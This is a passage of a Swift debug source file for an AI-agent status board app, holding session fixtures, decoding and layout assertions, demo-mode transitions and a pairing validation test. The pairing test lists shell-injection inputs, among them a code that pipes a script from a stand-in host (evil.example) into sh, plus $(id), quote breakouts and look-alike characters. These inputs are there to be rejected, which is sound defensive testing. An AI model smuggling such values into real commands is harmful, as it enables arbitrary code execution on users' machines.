                {"id":"seed-minimal","name":"claude-status","status":"coding","message":"Edit","project":"claude-status","source":"claude","host":null,"createdAt":1793209331884,"updatedAt":1793209331890,
                "subtasks":{"turnEnded":false,"running":4,"blocked":0,"failed":0,"done":2,"items":[
                {"id":"5394db0c7caa12460b2ee93c","n":3,"label":"Subagent 3","state":"testing","activity":"Bash"},
                {"id":"acfaf4d87e271423e1e00c4a","n":4,"label":"Subagent 4","state":"coding","activity":"Edit"},
                {"id":"7432dad7af008ed097925c74","n":5,"label":"Subagent 5","state":"planning","activity":"WebFetch"},
                {"id":"3d93bcc479369cf4d295b2b6","n":6,"label":"Subagent 6","state":"coding","activity":"Write"}]}}
                """#),
            ("hold", #"""
                {"id":"seed-hold","name":"Collect the background reports","status":"planning","message":"Reading subagent results","project":"claude-status","source":"claude","host":null,"createdAt":1793209331880,"updatedAt":1793209331884,
                "subtasks":{"turnEnded":false,"running":0,"blocked":0,"failed":0,"done":3,"items":[]}}
                """#),
            ("background", #"""
                {"id":"seed-background","name":"Land the docs and CI sweep","status":"testing","message":"2 subagents still running","project":"claude-status","source":"claude","host":null,"createdAt":1793209331874,"updatedAt":1793209331879,
                "subtasks":{"turnEnded":true,"running":2,"blocked":0,"failed":0,"done":3,"items":[
                {"id":"08fee937f71c6198e80fbc87","n":4,"label":"Run the server suite on Postgres","state":"testing","activity":"Run the root suite with --no-file-parallelism"},
                {"id":"3059021926a12f41407c831d","n":5,"label":"Sweep docs for stale flags","state":"coding","activity":"Editing docs.html"}]}}
                """#),
            ("finished", #"""
                {"id":"seed-finished","name":"Map the board layout code","status":"coding","message":"Editing BoardLayout.swift","project":"claude-status","source":"claude","host":null,"createdAt":1793209331859,"updatedAt":1793209331874,
                "subtasks":{"turnEnded":false,"running":0,"blocked":0,"failed":0,"done":12,"items":[]}}
                """#),
            ("failed", #"""
                {"id":"seed-failed","name":"Prepare the 1.6.4 release","status":"coding","message":"Editing RELEASE-1.6.4.md","project":"claude-status","source":"claude","host":null,"createdAt":1793209331851,"updatedAt":1793209331859,
                "subtasks":{"turnEnded":false,"running":2,"blocked":0,"failed":1,"done":4,"items":[
                {"id":"e64b1cceac06588757ecc96b","n":5,"label":"Run the migration tests","state":"testing","activity":"Run the store migration tests"},
                {"id":"e2c73d81da1455b3eaf358cc","n":6,"label":"Audit the Android strings","state":"failed","activity":"Failed: API error (overloaded)"},
                {"id":"caa9caff0545175d746dae6c","n":7,"label":"Draft release notes","state":"coding","activity":"Writing RELEASE-1.6.4.md"}]}}
                """#),
            ("two-blocked", #"""
                {"id":"seed-two-blocked","name":"Prepare the Android release","status":"blocked","message":"Needs approval: Audit the Android strings +1","project":"claude-status","source":"claude","host":null,"createdAt":1793209331845,"updatedAt":1793209331851,
                "subtasks":{"turnEnded":false,"running":3,"blocked":2,"failed":0,"done":0,"items":[
                {"id":"578acf7e9e0804166a49689e","n":1,"label":"Run the migration tests","state":"testing","activity":"Run the store migration tests"},
                {"id":"78844cab97ff5fb50d2b0e52","n":2,"label":"Draft release notes","state":"coding","activity":"Writing RELEASE-1.6.4.md"},
                {"id":"b5da9de92b72cca9506f79d0","n":3,"label":"Audit the Android strings","state":"blocked","activity":"Approve: Editing strings.xml"},
                {"id":"3c80c99fd926cdb015609ece","n":4,"label":"Run the page checks","state":"testing","activity":"Run test/pages.test.ts"},
                {"id":"3029de2f327479a99a6c53ff","n":5,"label":"Summarize the hook diff","state":"blocked","activity":"Approve: git diff origin/master -- cli"}]}}
                """#),
            ("blocked", #"""
                {"id":"seed-blocked","name":"Verify the hook before release","status":"blocked","message":"Needs approval: verify:hook","project":"claude-status","source":"claude","host":null,"createdAt":1793209331823,"updatedAt":1793209331845,
                "subtasks":{"turnEnded":false,"running":9,"blocked":1,"failed":0,"done":15,"items":[
                {"id":"d6eb60f4020603989cf4fc11","n":13,"label":"review:hook","state":"testing","activity":"Run hook tests with --no-file-parallelism"},
                {"id":"fbb414dd278da301e2b11d84","n":14,"label":"review:listener","state":"coding","activity":"Editing listener.ts"},
                {"id":"462d60f8f5125275240ab941","n":15,"label":"review:product","state":"planning","activity":"Searching: SubagentStop payload fields"},
                {"id":"d549dc809644b0887afef25e","n":16,"label":"review:server","state":"coding","activity":"Editing store.ts"},
                {"id":"b41cc0fd5f8877cae7dc3b1c","n":17,"label":"review:ios","state":"coding","activity":"Editing SessionCardView.swift"},
                {"id":"cd424cb9fc231993f5545373","n":18,"label":"review:android","state":"planning","activity":"Reading developer.android.com"},
                {"id":"667bbd533aee86e94294dbf6","n":19,"label":"verify:hook","state":"blocked","activity":"Approve: npm test -- hook"},
                {"id":"aaa1e2f4f9481280bf271125","n":20,"label":"verify:server","state":"testing","activity":"npm test -- store"},
                {"id":"e345355ee495c85c8e44185e","n":21,"label":"verify:web","state":"coding","activity":"Editing card.css"},
                {"id":"9670b0f4ef4ad5a9d3572c54","n":22,"label":"verify:privacy","state":"planning","activity":"Delegating: Search payloads for prompt text"}]}}
                """#),
            ("thirty", #"""
                {"id":"seed-thirty","name":"Implement subtasks across all clients","status":"coding","message":"Editing BoardLayout.swift","project":"claude-status","source":"claude","host":null,"createdAt":1793209331671,"updatedAt":1793209331823,
                "subtasks":{"turnEnded":false,"running":30,"blocked":0,"failed":0,"done":186,"items":[
                {"id":"6b944b2ed97ca824f6d749b8","n":187,"label":"implement:server","state":"coding","activity":"Editing store.ts"},
                {"id":"9055dd87cbfe940cc74d6561","n":188,"label":"implement:hook","state":"coding","activity":"Editing agstatus-hook.js"},
                {"id":"ee2d8bae880193b6eda980c8","n":189,"label":"implement:ios","state":"coding","activity":"Editing SessionCardView.swift"},
                {"id":"93e06926147934b85ad993d9","n":190,"label":"implement:android","state":"coding","activity":"Editing SessionCard.kt"},
                {"id":"f21cbb093be1e0854d52a0ee","n":191,"label":"implement:web","state":"coding","activity":"Editing card.css"},
                {"id":"31dc951143043d5452b3ec35","n":192,"label":"implement:docs","state":"coding","activity":"Editing docs.html"},
                {"id":"aba0002f0691ee6a6fe13924","n":193,"label":"test:server","state":"testing","activity":"npm test -- store"},
                {"id":"89bb1395e4b93fb2a375ea5a","n":194,"label":"test:hook","state":"testing","activity":"Run hook tests — 214 passed"},
                {"id":"d5e763e3494c53f2241cd407","n":195,"label":"test:ios","state":"coding","activity":"xcodebuild test -scheme AgStatus"},
                {"id":"9c293ccf6b3bd87b349d6ef8","n":196,"label":"test:android","state":"coding","activity":"./gradlew testDebugUnitTest"},
                {"id":"f0208bf3682908cfac847fb6","n":197,"label":"review:server","state":"planning","activity":"Searching: store.ts agent_id"},
                {"id":"240edba1286f081e2f177a46","n":198,"label":"review:hook","state":"planning","activity":"Reading code.claude.com"},
                {"id":"94666b14292859c4ed92f716","n":199,"label":"review:ios","state":"coding","activity":"Editing BoardView.swift"},
                {"id":"d9d353c4b5b58de54aca01b1","n":200,"label":"review:android","state":"planning","activity":"Searching: SessionCard usages"},
                {"id":"9a9393614c7cfe617e97eb55","n":201,"label":"review:web","state":"planning","activity":"Searching: app.js paint()"},
                {"id":"f81ad6ffdd0494661e5ad9f1","n":202,"label":"review:privacy","state":"planning","activity":"Delegating: Search payloads for prompt text"},
                {"id":"17363a5918465b4f89898d79","n":203,"label":"verify:server","state":"testing","activity":"Run the e2e suite"},
                {"id":"935d45b0baaab44021dc9a57","n":204,"label":"verify:hook","state":"testing","activity":"Run the payload fixtures"},
                {"id":"8cb0d54424bfbcdb8088dc77","n":205,"label":"verify:ios","state":"coding","activity":"Snapshot the card at three widths"},
                {"id":"653132b30469127aff3b3828","n":206,"label":"verify:android","state":"coding","activity":"Run the screenshot tests"},
                {"id":"059dac80ccf7e503202b4320","n":207,"label":"verify:web","state":"testing","activity":"Run the card fixtures"},
                {"id":"ac37cbca5a5d12b98c785520","n":208,"label":"verify:migration","state":"testing","activity":"Run the migration on a copy"},
                {"id":"37198b1aeac1783cdc155f30","n":209,"label":"Map the SubagentStart payload","state":"planning","activity":"Searching: SubagentStart agent_type"},
                {"id":"75853e47f3b95f0fa64779a6","n":210,"label":"Check the Codex rollout schema","state":"planning","activity":"Reading github.com"},
                {"id":"c3e15533a54d147d1edc026b","n":211,"label":"Draft the 1.7 release notes","state":"coding","activity":"Writing v1.7.0.md"},
                {"id":"25a719db4b6f7d51a6870e71","n":212,"label":"Audit push copy for subtasks","state":"coding","activity":"Editing NotificationManager.swift"},
                {"id":"4141b3a62ee9ab57f5cae685","n":213,"label":"map:sizing","state":"planning","activity":"Delegating: Count subagents per session"},
                {"id":"bb54c51687583f6ea70f5565","n":214,"label":"map:limits","state":"planning","activity":"Searching: webhook budget per workspace"},
                {"id":"7fcbafa2f50d8ad21d2f7d6c","n":215,"label":"map:minimal","state":"planning","activity":"Delegating: Search the hook for MINIMAL"},
                {"id":"9cb8c8907d472f4546ed1c22","n":216,"label":"map:codex","state":"planning","activity":"Reading developers.openai.com"}]}}
                """#),
            ("ten", #"""
                {"id":"seed-ten","name":"Review and verify the subtasks branch","status":"planning","message":"Running workflow: review-and-verify","project":"claude-status","source":"claude","host":null,"createdAt":1793209331639,"updatedAt":1793209331670,
                "subtasks":{"turnEnded":false,"running":10,"blocked":0,"failed":0,"done":15,"items":[
                {"id":"2c6fb5642df321bc8ae2919b","n":13,"label":"review:hook","state":"testing","activity":"Run hook tests with --no-file-parallelism"},
                {"id":"2f438243b248645cd24f356c","n":14,"label":"review:listener","state":"coding","activity":"Editing listener.ts"},
                {"id":"0fde93dbef73e5bbadd64051","n":15,"label":"review:product","state":"planning","activity":"Searching: SubagentStop payload fields"},
                {"id":"f2a1bd024956b34ae8dca8db","n":16,"label":"review:server","state":"coding","activity":"Editing store.ts"},
                {"id":"d0bc857c743573ba42f7591a","n":17,"label":"review:ios","state":"coding","activity":"Editing SessionCardView.swift"},
                {"id":"ab7ded2567f5ac7ac905f077","n":18,"label":"review:android","state":"planning","activity":"Reading developer.android.com"},
                {"id":"5d02973dc88279cb00964bd8","n":19,"label":"verify:hook","state":"testing","activity":"Run the hook suite — 214 tests"},
                {"id":"4847f0afc440241b25eec65f","n":20,"label":"verify:server","state":"testing","activity":"npm test -- store"},
                {"id":"90c2d294f975ed17708b8d34","n":21,"label":"verify:web","state":"coding","activity":"Editing card.css"},
                {"id":"71d73939988e8fcf028e3eed","n":22,"label":"verify:privacy","state":"planning","activity":"Delegating: Search payloads for prompt text"}]}}
                """#),
            ("two", #"""
                {"id":"seed-two","name":"Ship the store migration","status":"planning","message":"Draft release notes","project":"claude-status","source":"claude","host":null,"createdAt":1793209331631,"updatedAt":1793209331639,
                "subtasks":{"turnEnded":false,"running":2,"blocked":0,"failed":0,"done":0,"items":[
                {"id":"44a4dc7558ae7a432f86b923","n":1,"label":"Run the migration tests","state":"testing","activity":"Run the store migration tests"},
                {"id":"62668ff106691d43c7be2abe","n":2,"label":"Draft release notes","state":"coding","activity":"Writing RELEASE-1.6.4.md"}]}}
                """#),
            ("none", #"""
                {"id":"seed-none","name":"Fix the iPad board layout","status":"coding","message":"Editing BoardLayout.swift","project":"claude-status","source":"claude","host":null,"createdAt":1793209331627,"updatedAt":1793209331630}
                """#),
        ]
        // The line breaks taken out again: the server's own bytes.
        let sent = frame.map { (scenario: $0.scenario, json: $0.json.replacingOccurrences(of: "\n", with: "")) }

        // The frame as SSEClient decodes a snapshot: one array, where one
        // session this build could not read would have cost the whole board.
        let board = try? decoder.decode([Session].self,
                                        from: Data("[\(sent.map(\.json).joined(separator: ","))]".utf8))
        assert(board?.map(\.id) == sent.map { "seed-\($0.scenario)" }, "the snapshot decodes, every card in it")

        for (scenario, json) in sent {
            guard let session = try? decoder.decode(Session.self, from: Data(json.utf8)),
                  let raw = (try? JSONSerialization.jsonObject(with: Data(json.utf8))) as? [String: Any] else {
                assertionFailure("\(scenario): the session decodes")
                continue
            }
            // Field for field what the server sent, set beside a reading of
            // the same bytes with no tolerance in it: nothing a real server
            // sends is dropped, defaulted or re-derived on the way in.
            assert(session.status.rawValue == raw["status"] as? String && session.message == raw["message"] as? String
                   && session.source == raw["source"] as? String, "\(scenario): the card's reading")
            if let block = raw["subtasks"] as? [String: Any] {
                let items = block["items"] as? [[String: Any]] ?? []
                let subtasks = session.subtasks
                assert(subtasks?.turnEnded == block["turnEnded"] as? Bool && subtasks?.running == block["running"] as? Int
                       && subtasks?.blocked == block["blocked"] as? Int && subtasks?.failed == block["failed"] as? Int
                       && subtasks?.done == block["done"] as? Int, "\(scenario): the counts as sent")
                assert(subtasks?.items.count == items.count, "\(scenario): every item kept")
                for (item, sentItem) in zip(subtasks?.items ?? [], items) {
                    assert(item.id == sentItem["id"] as? String && item.n == sentItem["n"] as? Int
                           && item.label == sentItem["label"] as? String
                           && item.state.rawValue == sentItem["state"] as? String
                           && item.activity == sentItem["activity"] as? String, "\(scenario): item \(item.n) as sent")
                }
                let ordinals = subtasks?.items.map(\.n) ?? []
                assert(zip(ordinals, ordinals.dropFirst()).allSatisfy { $0 < $1 }, "\(scenario): in start order")
            } else {
                assert(session.subtasks == nil, "\(scenario): no block, today's card")
            }
            // WORKING on the one card whose turn is over while its subagents
            // work; every other card wears the status it was sent.
            assert(session.displayStatus == (scenario == "background" ? .working : DisplayStatus(session.status)),
                   "\(scenario): display status")
            assert((try? JSONEncoder().encode(session)).flatMap { try? decoder.decode(Session.self, from: $0) }
                   == session, "\(scenario): round trip")
        }

        // What each card draws from them, in a column's three slots and under
        // the phone's two: the rows on show by ordinal — the oldest, with
        // every blocked one among them — and the footer. Then the session
        // screen's counts. The web board reads the same footers off the same
        // frame.
        let drawn: [String: (column: [Int], columnFooter: String?, phone: [Int], phoneFooter: String?,
                             counts: String)] = [
            "two": ([1, 2], nil, [1, 2], nil, "2 running"),
            "ten": ([13, 14, 15], "+7 more · 15 done", [13, 14], "+8 more · 15 done", "10 running"),
            "thirty": ([187, 188, 189], "+27 more · 186 done", [187, 188], "+28 more · 186 done", "30 running"),
            "blocked": ([13, 14, 19], "+7 more · 15 done", [13, 19], "+8 more · 15 done", "9 running · 1 blocked"),
            "two-blocked": ([1, 3, 5], "+2 more", [3, 5], "+3 more", "3 running · 2 blocked"),
            "failed": ([5, 6, 7], "4 done", [5, 6], "+1 more · 4 done", "2 running · 1 failed"),
            "finished": ([], "12 done", [], "12 done", ""),
            "background": ([4, 5], "3 done", [4, 5], "3 done", "2 running"),
            "hold": ([], "3 done", [], "3 done", ""),
            "minimal": ([3, 4, 5], "+1 more · 2 done", [3, 4], "+2 more · 2 done", "4 running"),
            "codex": ([3, 4, 5], "2 done", [3, 4], "+1 more · 2 done", "3 running"),
            "long": ([3, 4, 5], "2 done", [3, 4], "+1 more · 2 done", "3 running"),
        ]
        for session in board ?? [] {
            let scenario = String(session.id.dropFirst("seed-".count))
            guard let subtasks = session.subtasks else { continue }
            guard let expected = drawn[scenario] else {
                assertionFailure("\(scenario): a block with nothing to check it against")
                continue
            }
            for (slots, phoneRules, rows, footer) in [(3, false, expected.column, expected.columnFooter),
                                                     (2, true, expected.phone, expected.phoneFooter)] {
                let shown = SubtaskSlots().resolved(for: [session], slots: slots, expanded: []).rows(for: session)
                assert(shown.map(\.n) == rows, "\(scenario): the rows in \(slots) slots")
                assert(SubtaskFooter.resolve(items: subtasks.items.count, shown: shown.count, done: subtasks.done,
                                             slots: slots, open: false, phoneRules: phoneRules)?.text == footer,
                       "\(scenario): the footer in \(slots) slots")
            }
            assert(SubtaskCopy.counts(running: subtasks.running, blocked: subtasks.blocked, failed: subtasks.failed)
                   == expected.counts, "\(scenario): the session screen's counts")
        }
        // Opened in place, the ten show whole in start order, and fold back.
        if let ten = board?.first(where: { $0.id == "seed-ten" }), let subtasks = ten.subtasks {
            let open = SubtaskSlots().resolved(for: [ten], slots: 3, expanded: [ten.id]).rows(for: ten)
            assert(open.map(\.n) == Array(13...22), "ten: open in place")
            assert(SubtaskFooter.resolve(items: subtasks.items.count, shown: open.count, done: subtasks.done,
                                         slots: 3, open: true, phoneRules: false)?.text == "Show less · 15 done",
                   "ten: the open footer")
        } else {
            assertionFailure("ten: on the board")
        }
        // The session screen puts whoever waits on you first.
        func screenOrder(_ id: String) -> [Int]? {
            board?.first { $0.id == id }?.subtasks.map { SubtaskScreenRow.ordered($0.items).map(\.n) }
        }
        assert(screenOrder("seed-blocked") == [19, 13, 14, 15, 16, 17, 18, 20, 21, 22], "blocked: first on the screen")
        assert(screenOrder("seed-two-blocked") == [3, 5, 1, 2, 4], "two blocked: first, in start order")

        // The demo, which has no server, reads these subagents as this one
        // did. A parent's own reading is what its last main-thread post said.
        let owns: [(id: String, own: (status: AgentStatus, message: String))] = [
            ("seed-background", (.done, "Turn finished")),
            ("seed-blocked", (.planning, "Running workflow: review-and-verify")),
            ("seed-two-blocked", (.planning, "Summarize the hook diff")),
        ]
        for (id, own) in owns {
            let session = board?.first { $0.id == id }
            assert(session.map { derived(own: own, items: $0.subtasks?.items ?? []) == ($0.status, $0.message) } == true,
                   "\(id): the demo derives what the server did")
        }
    }

    /// Pairing, checked alongside the decoders above when demo mode starts in
    /// a debug build. The pair command is the one string this app tells the
    /// user to paste into a terminal, and three things keep it to the words
    /// it means: the code is validated where it is decoded, the board's
    /// origin is rebuilt from a host with no shell syntax in it, and both are
    /// single-quoted anyway. Each is pinned here, because a screenshot of the
    /// Pair sheet looks the same whether any of them works. The Android
    /// client's ApiParsingTest carries the same cases.
    static func verifyPairing() {
        let decoder = JSONDecoder()
        // JSONSerialization rather than a literal, so newlines and quotes in
        // the cases below reach the decoder as the server would send them.
        func decoded(_ code: String) -> PairCode? {
            guard let data = try? JSONSerialization.data(
                withJSONObject: ["code": code, "expiresInSeconds": 900]) else { return nil }
            return try? decoder.decode(PairCode.self, from: data)
        }

        // The server's shape, stored canonical; undashed is what older servers sent.
        assert(decoded("ABCD-EFGH") == PairCode(code: "ABCD-EFGH", expiresInSeconds: 900), "canonical code")
        assert(decoded("abcd-efgh")?.code == "ABCD-EFGH", "lowercase is uppercased")
        assert(decoded("ABCDEFGH")?.code == "ABCD-EFGH", "undashed is grouped")
        assert(decoded("23456789")?.code == "2345-6789", "digits")

        let rejected = [
            "ABCD-EFGH; curl -fsSL http://evil.example/x.sh | sh #", // the tester's payload
            "ABCD;EFGH", "AB$(id)GH", "ABCD-$(id)", "ABCD`id`",
            "ABCD EFGH", "ABCD-EFGH ", " ABCD-EFGH", "ABCD-EFGH\n", "ABCD\nEFGH",
            "ABCD-EFG#", "ABCD-EFGH#", "ABCD-EFG'",
            // Off the alphabet: I, L, O, 0 and 1 are never minted.
            "ABCD-1234", "ABCD-EFGI", "ABCD-EFGL", "ABCD-EFGO", "ABCD-EFG0",
            // Off the shape.
            "ABC-DEFGH", "ABCD--EFGH", "ABCD-EFGHJ", "ABCDEFG", "ABCD_EFGH", "",
            // Uppercases into the alphabet, but was never ASCII.
            "abcdefgſ", "ＡBCD-EFGH",
        ]
        for code in rejected {
            assert(PairCode.canonical(code) == nil, "canonical(\(code.debugDescription))")
            assert(decoded(code) == nil, "decoded(\(code.debugDescription))")
        }

        // Quoting.
        assert(PairCode.shellQuoted("ABCD-EFGH") == "'ABCD-EFGH'", "plain word")
        assert(PairCode.shellQuoted("it's") == #"'it'\''s'"#, "embedded quote")
        assert(PairCode.shellQuoted("'") == #"''\'''"#, "lone quote")
        assert(PairCode.shellQuoted("") == "''", "empty word")

        let token = "ags_" + String(repeating: "a", count: 32) // built, not written: secret scanners
        func board(_ raw: String) -> Board? {
            URL(string: raw).flatMap(AgStatusAPI.parseBoardURL)
        }
        let code = PairCode(code: "ABCD-EFGH", expiresInSeconds: 900)
        let installer = "curl -fsSL https://agstatus.online/install.sh | sh -s -- "
        assert(code.command(for: Board(baseURL: Board.defaultServer, token: token))
               == installer + "--code 'ABCD-EFGH'", "default server: no --url")
        if let selfHosted = board("https://board.example:8443/w/\(token)") {
            assert(code.command(for: selfHosted)
                   == installer + "--code 'ABCD-EFGH' --url 'https://board.example:8443'", "self-hosted")
        } else {
            assertionFailure("self-hosted board parses")
        }
        // The backstop: a value that never went through a check is still one word.
        assert(PairCode(code: "x'; id; '", expiresInSeconds: 1)
                .command(for: Board(baseURL: Board.defaultServer, token: token))
               == installer + #"--code 'x'\''; id; '\'''"#, "unchecked code stays one word")

        // The origin is rebuilt: userinfo goes, and with it the Android form of this bug.
        let userinfo = board("https://x;$(touch${IFS}pwned1);@agstatus.online/w/\(token)")
        assert(userinfo?.baseURL.absoluteString == "https://agstatus.online", "userinfo dropped")
        assert(userinfo?.isDefaultServer == true, "and so no --url at all")
        // The host is guarded: the rebuild keeps it, so shell syntax in it is refused.
        for raw in ["https://x$(id).example/w/\(token)", "http://a$(id).local:3000",
                    "https://a;b.example/w/\(token)", "https://a'b.example",
                    "https://a%3Bb.example/w/\(token)",
                    // Look-alikes Foundation's IDNA maps to ASCII `;`, `$()`, `'`
                    // and `;` again: the guard sees the mapped host, not these.
                    "https://a\u{FF1B}b.example/w/\(token)", "https://a\u{FF04}\u{FF08}id\u{FF09}.example",
                    "https://a\u{FF07}b.example", "https://a\u{037E}b.example"] {
            assert(board(raw) == nil, "host refused: \(raw)")
        }
        // ...and nothing a real board uses is. ApiParsingTest takes the same ones.
        assert(board("http://192.168.1.10:8080/")?.baseURL.absoluteString == "http://192.168.1.10:8080", "LAN IPv4")
        assert(board("http://agstatus.local:4000")?.baseURL.absoluteString == "http://agstatus.local:4000", ".local")
        assert(board("http://dev_pc.local:3000")?.baseURL.absoluteString == "http://dev_pc.local:3000",
               "an underscore is not shell syntax")
        assert(board("https://my_host.example/w/\(token)")?.baseURL.absoluteString == "https://my_host.example",
               "nor over https")
        assert(board("https://bücher.example/w/\(token)")?.baseURL.absoluteString
               == "https://xn--bcher-kva.example", "IDN arrives as punycode")
        assert(board("https://агстатус.рф/w/\(token)")?.baseURL.absoluteString
               == "https://xn--80aai0dbebi.xn--p1ai", "a whole IDN host too")
    }
    #endif

    // MARK: Internals

    private static func advance(_ session: Session, at now: Int64) -> Session {
        #if DEBUG
        // A card with subagents changes by them alone; its own session is
        // held where the scenario put it.
        if let board = subtaskScenario, session.id == board.focus, session.subtasks != nil {
            return advanceSubtasks(session, on: board, at: now)
        }
        #endif
        var next = session
        let status = transitions[session.status]?.randomElement() ?? session.status

        // A stopped agent emits nothing at all.
        //
        // `blocked` means it halted to ask a human, and `done` means it handed
        // the turn back — in both the process is waiting, so no hook fires and
        // the board hears nothing until something actually changes. The demo
        // used to re-stamp `updatedAt` and swap the message on these anyway,
        // every few seconds, which was two lies at once: the board never
        // receives such an update, and re-stamping resets the very interval the
        // closing beat measures, so a card that had genuinely been waiting
        // three minutes silently became one that had waited four seconds.
        //
        // Now a waiting card holds completely still until it moves, and the
        // wait it reports on the way out is real.
        guard status != session.status || session.status.isActive else { return session }

        next.status = status
        if status != session.status || Bool.random() {
            next.message = messages[status]?.randomElement() ?? session.message
        }
        next.updatedAt = now
        next.tokens = spend(next.tokens, working: status.isActive)
        return next
    }

    /// What a demo session's lifetime total does between ticks.
    ///
    /// Only a working agent spends, so a card sitting in `done` or `blocked`
    /// holds its figure still — on this board a number that moves is supposed
    /// to mean something changed.
    ///
    /// The session that starts without a total is the one worth watching: a
    /// real one gets its first figure minutes after the card appears, on the
    /// hook's 15-minute throttle, so the demo eventually hands it one. A
    /// reviewer then sees both halves of the contract — a card with no number,
    /// and the number turning up later without the card being rebuilt.
    private static func spend(_ tokens: Int64?, working: Bool) -> Int64? {
        guard working else { return tokens }
        guard let tokens else {
            return Double.random(in: 0..<1) < 0.2 ? Int64.random(in: 18_000...44_000) : nil
        }
        return tokens + Int64.random(in: 4_000...26_000)
    }

    /// Weighted plausible transitions (duplicates raise the odds of staying put).
    private static let transitions: [AgentStatus: [AgentStatus]] = [
        .idle: [.planning, .planning, .idle],
        .planning: [.coding, .coding, .planning],
        .coding: [.coding, .coding, .coding, .testing],
        .testing: [.testing, .coding, .done, .blocked],
        .blocked: [.blocked, .blocked, .coding],
        .done: [.done, .done, .planning],
    ]

    private static let messages: [AgentStatus: [String]] = [
        .idle: [
            "Waiting for a task",
            "Session idle",
        ],
        .planning: [
            "Reading the codebase…",
            "Exploring src/ for entry points",
            "Drafting an implementation plan",
            "Reviewing open issues",
        ],
        .coding: [
            "Editing src/auth/token.ts",
            "Refactoring api/routes.ts",
            "Implementing retry with backoff",
            "Writing SessionStore.swift",
            "Fixing null check in parser.js",
        ],
        .testing: [
            "npm test",
            "Running unit tests…",
            "pytest -q — 87 passed",
            "vitest run — 3 suites",
        ],
        .blocked: [
            "Needs permission approval",
            "Waiting for your input",
            "Merge conflict needs review",
        ],
        .done: [
            "All tasks complete",
            "PR ready for review",
            "Finished — 12 files changed",
        ],
    ]

    private static func nowMillis() -> Int64 {
        Int64(Date().timeIntervalSince1970 * 1000)
    }
}
